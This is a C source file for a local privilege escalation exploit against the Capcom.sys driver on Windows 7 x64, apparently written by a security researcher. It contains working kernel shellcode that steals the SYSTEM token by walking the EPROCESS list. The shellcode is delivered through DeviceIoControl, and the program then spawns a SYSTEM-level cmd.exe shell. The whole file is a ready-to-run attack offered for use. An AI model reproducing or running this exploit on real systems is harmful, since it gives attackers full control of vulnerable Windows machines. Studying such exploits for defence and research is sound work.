// Exploit    : Capcom.sys Local Privilege Escalation 
// Author     : Hashim Jawad - @ihack4falafel
// OS         : Windows 7 Enterprise (x64) SP1
// Inspired by: OJ Reeves's "Hackingz Ze Komputerz" stream

#include <stdio.h>
#include <windows.h>

int main() {

	wchar_t* deviceName = L"\\\\.\\Htsysm72FB";        // make sure the character set is set to unicode under project defaults
	const DWORD iocontrolCode = 0xAA013044;
	PBYTE inputBuffer;
	DWORD outputBuffer = 0;
	DWORD bytesReturned = 0;
	BOOL ioResult;

	HANDLE capcomDriver = CreateFile(deviceName,       // lpFileName
		GENERIC_READ | GENERIC_WRITE,                  // dwDesiredAccess
		FILE_SHARE_READ | FILE_SHARE_WRITE,            // dwShareMode
		NULL,                                          // lpSecurityAttributes
		OPEN_EXISTING,                                 // dwCreationDisposition
		FILE_ATTRIBUTE_NORMAL,                         // dwFlagsAndAttributes
		NULL                                           // hTemplateFile
	);

	if (capcomDriver == INVALID_HANDLE_VALUE) {
		fprintf(stderr, "[!] Failed to grab device handle with error code: %u\n", GetLastError());
		return 1;
	}

	fprintf(stdout, "[+] CreateFile was successful! Driver handle is: %p\n", capcomDriver);
	
	BYTE shellCode[] = {
	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,     // pointer placeholder
	0x48, 0x31, 0xC0,                                   // xor rax, rax                     ; zero out rax
	0x65, 0x48, 0x8B, 0x80, 0x88, 0x01, 0x00, 0x00,     // mov rax,QWORD PTR gs:[rax+0x188] ; move current thread (KTHREAD) into rax (KPCR + 0x180(KPRCB) + 0x8(KTHREAD))
	0x48, 0x8B, 0x40, 0x70,                             // mov rax,QWORD PTR [rax+0x70]     ; move current EPROCESS to rax (KTHREAD + 0x50(KAPC_STATE) + 0x20(EPROCESS))
	0x48, 0x89, 0xC1,                                   // mov rcx, rax                     ; make copy of the current process's EPROCESS
	0x49, 0x89, 0xCB,                                   // mov r11,rcx                      ; store RefCnt from token (EX_FAST_REF) struct
	0x49, 0x83, 0xE3, 0x07,                             // and r11,0x7
	0x48, 0xC7, 0xC2, 0x04, 0x00, 0x00, 0x00,           // mov rdx,0x4                      ; move SYSTEM PID to rdx
	0x48, 0x8B, 0x80, 0x88, 0x01, 0x00, 0x00,           // mov rax,QWORD PTR [rax+0x188]    ; fetch ActiveProcessLinks doubly-linked list (EPROCESS+0x188)
	0x48, 0x2D, 0x88, 0x01, 0x00, 0x00,                 // sub rax, 0x188                   ; loop thru the list processes and extract UniqueProcessId (EPROCESS+0x180)
	0x48, 0x39, 0x90, 0x80, 0x01, 0x00, 0x00,           // cmp QWORD PTR [rax+0x180],rdx    ; untill you find SYSTEM PID of 4
	0x75, 0xEA,											// jne $-0x14+(0x2)
	0x48, 0x8B, 0x90, 0x08, 0x02, 0x00, 0x00,           // mov rdx,QWORD PTR [rax+0x208]    ; grab SYSTEM's process EPROCESS token
	0x48, 0x83, 0xE2, 0xF0,                             // and rdx, 0x0fffffffffffffff0
	0x4C, 0x09, 0xDA,                                   // or rdx,r11
	0x48, 0x89, 0x91, 0x08, 0x02, 0x00, 0x00,           // mov QWORD PTR [rcx+0x208],rdx    ; replace the current EPROCESS's token
	0x48, 0x31, 0xC0,                                   // xor rax, rax                     ; simulate NTSTATUS SUCCESS! 
	0xC3,                                               // ret
	};

	inputBuffer = VirtualAlloc(NULL,                    // lpAddress
		sizeof(shellCode),                              // dwSize
		MEM_COMMIT | MEM_RESERVE,                       // flAllocationType
		PAGE_EXECUTE_READWRITE                          // flProtect
	);

	if (!inputBuffer) {
		fprintf(stderr, "[!] Failed to allocate memory with error code: %u\n", GetLastError());
		return 1;
	}

	fprintf(stdout, "[+] VirtualAlloc was successful!\n");
	
	memcpy(inputBuffer,                                 // Dst
		shellCode,                                      // Src
		sizeof(shellCode)                               // size of Src
	);

	fprintf(stdout, "[+] Shellcode has successfully been copied to input buffer!\n");


	*(PULONG_PTR)inputBuffer = (ULONG_PTR)(inputBuffer+8);
	//*(PULONG_PTR)(inputBuffer+8) = 0xCCCCCCCCCCCCCCCC;
	ULONG_PTR IpInBuffer = (ULONG_PTR)(inputBuffer + 8);
	
	ioResult = DeviceIoControl(capcomDriver,            // hDevice
		iocontrolCode,                                  // dwIoControlCode
		&IpInBuffer,                                    // lpInBuffer fp = *(fp-8)
		8,                                              // nInBufferSize
		&outputBuffer,                                  // lpOutBuffer
		4,                                              // nOutBufferSize
		&bytesReturned,                                 // lpBytesReturned
		NULL                                            // lpOverlapped
	);
	
	if (ioResult == FALSE) {
		fprintf(stderr, "[!] Failed to interact with Driver with error number: %u\n", GetLastError());
		return 1;
	}

	fprintf(stdout, "[+] DeviceIoControl was successful!\n");

	// spawn new cmd.exe as NT AUTHORITY\SYSTEM
	fprintf(stdout, "[+] Enjoy your new SYSTEM shell!\n");
	system("cmd.exe");

	// cleanup code
	if (capcomDriver != INVALID_HANDLE_VALUE) {
		CloseHandle(capcomDriver);
	}

	return 0;
}